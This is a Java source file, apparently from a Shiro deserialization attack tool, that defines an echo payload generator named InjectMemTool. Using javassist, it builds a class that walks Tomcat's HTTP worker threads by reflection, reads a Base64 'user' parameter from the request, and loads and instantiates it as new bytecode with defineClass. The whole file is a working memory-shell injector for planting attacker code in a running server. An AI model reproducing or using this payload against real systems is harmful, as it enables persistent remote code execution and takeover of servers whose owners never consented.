package com.summersec.attack.deser.plugins;

import com.summersec.attack.deser.echo.EchoPayload;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.CtNewConstructor;


public class InjectMemTool implements EchoPayload {
    @Override
    public CtClass genPayload(ClassPool pool) throws Exception {
        CtClass clazz = pool.makeClass("com.summersec.x.Test" + System.nanoTime());

        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        clazz.addMethod(CtMethod.make("    private static Object getFV(Object o, String s) throws Exception {\n        java.lang.reflect.Field f = null;\n        Class clazz = o.getClass();\n        while (clazz != Object.class) {\n            try {\n                f = clazz.getDeclaredField(s);\n                break;\n            } catch (NoSuchFieldException e) {\n                clazz = clazz.getSuperclass();\n            }\n        }\n        if (f == null) {\n            throw new NoSuchFieldException(s);\n        }\n        f.setAccessible(true);\n        return f.get(o);\n}", clazz));

        clazz.addConstructor(CtNewConstructor.make("    public InjectMemTool() {\n        try {\n            Object o;\n            String s;\n            String user = null;\n            Object resp;\n            boolean done = false;\n            Thread[] ts = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), \"threads\");\n            for (int i = 0; i < ts.length; i++) {\n                Thread t = ts[i];\n                if (t == null) {\n                    continue;\n                }\n                s = t.getName();\n                if (!s.contains(\"exec\") && s.contains(\"http\")) {\n                    o = getFV(t, \"target\");\n                    if (!(o instanceof Runnable)) {\n                        continue;\n                    }\n\n                    try {\n                        o = getFV(getFV(getFV(o, \"this$0\"), \"handler\"), \"global\");\n                    } catch (Exception e) {\n                        continue;\n                    }\n\n                    java.util.List ps = (java.util.List) getFV(o, \"processors\");\n                    for (int j = 0; j < ps.size(); j++) {\n                        Object p = ps.get(j);\n                        o = getFV(p, \"req\");\n                        resp = o.getClass().getMethod(\"getResponse\", new Class[0]).invoke(o, new Object[0]);\n\n                        Object conreq = o.getClass().getMethod(\"getNote\", new Class[]{int.class}).invoke(o, new Object[]{new Integer(1)});\n\n                        user = (String) conreq.getClass().getMethod(\"getParameter\", new Class[]{String.class}).invoke(conreq, new Object[]{new String(\"user\")});\n\n                        if (user != null && !user.isEmpty()) {\n                            byte[] bytecodes = org.apache.shiro.codec.Base64.decode(user);\n\n                            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{byte[].class, int.class, int.class});\n                            defineClassMethod.setAccessible(true);\n\n                            Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), new Object[]{bytecodes, new Integer(0), new Integer(bytecodes.length)});\n\n                            cc.newInstance().equals(conreq);\n                            done = true;\n                        }\n                        if (done) {\n                            break;\n                        }\n                    }\n                }\n            }\n        } catch (Exception e) {\n            ;\n        }\n}", clazz));

        return clazz;
    }
}



